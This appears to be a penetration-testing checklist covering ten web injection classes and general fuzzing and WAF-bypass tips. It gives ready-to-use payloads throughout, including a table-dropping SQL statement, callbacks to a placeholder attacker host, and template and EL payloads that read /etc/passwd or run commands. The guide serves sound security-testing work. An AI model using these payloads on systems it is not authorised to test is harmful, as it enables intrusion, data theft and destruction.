## ✅ **Injection Checklist (Offensive Security Focused)**

### 🔍 1. **SQL Injection (SQLi)**

- [ ] Submit a single quote (`'`) – does it cause an SQL error or unexpected behavior?
- [ ] Submit double quote (`"`) – does it cause a different error?
- [ ] Test boolean conditions: `' AND '1'='1` vs `' AND '1'='2` – are responses different?
- [ ] Inject time-based payload: `' AND SLEEP(5)--` (MySQL) or `' WAITFOR DELAY '0:0:5'--` (MSSQL) – is there a delay?
- [ ] Try UNION injection: `' UNION SELECT NULL, @@version, NULL--` – does version appear?
- [ ] Stacked queries: `'; DROP TABLE users--` – check if multiple statements allowed.
- [ ] Out-of-band (OOB) exfiltration: `' AND 1=1; exec xp_dirtree '\\attacker.com\share'--` (MSSQL) – get DNS/callback.
- [ ] Test all input vectors: GET, POST, Cookie, User-Agent, Referer, X-Forwarded-For, JSON/XML.

> 🛠 **Tools:** sqlmap, Burp Intruder, custom boolean/time scripts.

---

### 📦 2. **NoSQL Injection (MongoDB, CouchDB, etc.)**

- [ ] Inject `$ne` (not equal) operator: `{"username": {"$ne": null}, "password": {"$ne": null}}` – bypass login?
- [ ] Use `$gt` / `$lt` for data extraction: `{"id": {"$gt": 0}}` – enumerate values?
- [ ] Try `$regex` for blind extraction: `{"username": {"$regex": "^admin"}}` – confirm pattern matching.
- [ ] Inject `$where` with JavaScript: `{"$where": "this.password.length > 0"}` – execute JS?
- [ ] Test URL-encoded operators: `?username[$ne]=null&password[$ne]=null`.
- [ ] Fuzz JSON payloads in POST/PUT requests – add unexpected operators.

> 🛠 **Tools:** NoSQLMap, Mongo-Exploit, Burp Suite with custom JSON payloads.

---

### 💻 3. **Command Injection (OS / Shell)**

- [ ] Append `; id` to any parameter that executes system commands (ping, traceroute, convert, etc.).
- [ ] Try `| id`, `& id`, `$(id)`, `` `id` `` – observe command output.
- [ ] Time-based blind: `; sleep 5` – does response take longer?
- [ ] Out-of-band detection: `; nslookup attacker.com` or `; ping -c 5 attacker.com` – monitor DNS/ICMP.
- [ ] Use encoding bypasses: `%0aid`, `%0a%0aid`, `%26id`.
- [ ] Inject in file upload filenames: `test; id .txt`.
- [ ] Test in HTTP headers (User-Agent, X-Forwarded-For, etc.) if passed to shell commands.

> 🛠 **Tools:** Commix, Burp Intruder (command injection wordlist), curl.

---

### 📁 4. **LDAP Injection**

- [ ] Inject `*` in username field – does it return all users (wildcard enumeration)?
- [ ] Try `*)(uid=*` to bypass authentication – logs in as first user?
- [ ] Blind LDAP injection: `(&(uid=admin)(userPassword=*))` – test via timing or error differences.
- [ ] Use `|` (OR) operators: `(|(uid=admin)(cn=*))` – bypass filters.
- [ ] Test for LDAP filter termination: `admin)(!(&(uid=admin` – break out of intended filter.

> 🛠 **Tools:** ldapsearch, custom Python scripts (python-ldap), Burp Intruder.

---

### 🧠 5. **Server-Side Template Injection (SSTI)**

- [ ] Inject simple math expression: `{{7*7}}`, `${7*7}`, `#{7*7}`, `{{7*'7'}}` – does it evaluate to `49` or `7777777`?
- [ ] Try `{{config}}`, `{{self}}`, `{{_self}}` – information disclosure?
- [ ] Identify template engine: `{{7*7}}` → Jinja2/Twig; `${7*7}` → Freemarker; `#{7*7}` → Thymeleaf.
- [ ] Probe for RCE: `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}` (Python Jinja2).
- [ ] Try `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`.
- [ ] Test all input fields: URL parameters, POST data, file uploads (template files), cookies.

> 🛠 **Tools:** Tplmap, Burp Intruder (SSTI payloads), manual Python.

---

### ✉️ 6. **Email / SMTP Header Injection**

- [ ] Inject newline (`%0a`) in email fields: `attacker@example.com%0aBCC: victim@example.com`.
- [ ] Use CRLF (`%0d%0a`) for header injection: `subject=Hello%0d%0aCC: internal@example.com`.
- [ ] Add custom headers: `%0aX-Mailer: Test%0aPriority: high`.
- [ ] Test contact forms, newsletter signup, feedback, password reset email fields.
- [ ] Observe if email is sent with injected BCC/CC or altered subject/body.

> 🛠 **Tools:** Burp Repeater, custom netcat listener, email server logs.

---

### 🎯 7. **Host Header Injection**

- [ ] Modify `Host` header to a malicious domain: `Host: attacker.com`.
- [ ] Check if password reset link uses the injected host (password reset poisoning).
- [ ] Test for cache poisoning by sending request with malicious `Host` and observing cached responses.
- [ ] Try `Host: 127.0.0.1` or `Host: internal-service` – SSRF via host header?

> 🛠 **Tools:** Burp Repeater, curl (`-H "Host: evil.com"`).

---

### 🧬 8. **ORM Injection (HQL, JPA, etc.)**

- [ ] Identify where raw HQL/JPQL concatenation is used: `from User where name = '" + input + "'`.
- [ ] Inject `' or 1=1 --` – does it return all rows?
- [ ] Try `' and 1=0 union select password from User --` – data extraction.
- [ ] Test for blind injection with `' and 1=1 --` vs `' and 1=2 --`.

> 🛠 **Tools:** Manual testing, Burp Intruder, custom ORM-aware payloads.

---

### 📄 9. **XML / XPath Injection**

- [ ] Inject `' or '1'='1` into XPath query – does it return all nodes?
- [ ] Use `' or position()=1` – extract first element.
- [ ] Blind XPath: `' and substring(//user[1]/password,1,1)='a'` – brute-force data.
- [ ] Test XML-based APIs that process user input in XPath expressions.

> 🛠 **Tools:** Burp Intruder, custom Python scripts (lxml, xml.etree).

---

### 🔣 10. **Expression Language (EL) Injection (Java)**

- [ ] Inject `${7*7}` in any field – does it evaluate to `49`?
- [ ] Try `${pageContext.request.remoteUser}` – leak user info.
- [ ] Escalate to RCE: `${Runtime.getRuntime().exec('id')}`.
- [ ] Test in JSF, Spring, or legacy JSP applications.

> 🛠 **Tools:** Burp Repeater, manual payloads.

---

## 📌 **General Injection Testing Checklist**

- [ ] **Fuzz all user-controllable inputs** with special characters: `'`, `"`, `;`, `|`, `&`, `$`, `` ` ``, `\n`, `%0a`, `\r\n`.
- [ ] **Test both authenticated and unauthenticated** states – injection may be deeper after login.
- [ ] **Monitor response differences**: HTTP status codes, response length, time, error messages.
- [ ] **Use encoding bypasses**: URL encode, double URL encode, Unicode, HTML entities.
- [ ] **Check for WAF bypass** using case variation, comment insertion (`/**/`), or obfuscation.
- [ ] **Automate where possible** (sqlmap, commix, NoSQLMap) but manually verify false positives.
- [ ] **Combine injection with other vulnerabilities** (e.g., XXE → SQLi, SSRF → command injection).
- [ ] **Document evidence** clearly: payload, request/response, impact demonstration.

---

### 🛠 **Bonus Tools for Injection Testing**

| Tool | Purpose |
|------|---------|
| sqlmap | Automated SQL injection (all DBMS) |
| NoSQLMap | NoSQL injection (MongoDB, CouchDB) |
| Commix | Command injection automation |
| Tplmap | SSTI detection & exploitation |
| Burp Suite (Pro) | Intruder, Scanner, Repeater |
| FFUF / WFuzz | Fuzzing injection points |
| HackTricks payloads | Comprehensive injection wordlists |
| Custom Python scripts | Blind Boolean/Time-based automation |

---

### 💡 **Pro Tips**

- **Start simple** – a single quote is often enough to confirm SQLi.
- **Think like a developer** – where would they concatenate user input into a query or command?
- **Don't ignore headers** – `User-Agent`, `Referer`, `X-Forwarded-For` are often overlooked injection vectors.
- **Blind injection is common** – learn time-based and Boolean techniques.
- **WAFs can be bypassed** – try case variation, encoding, SQL comments (`/**/`), and HTTP parameter pollution.
- **Always test with `sleep()`** – even if no output, a delay confirms blind injection.
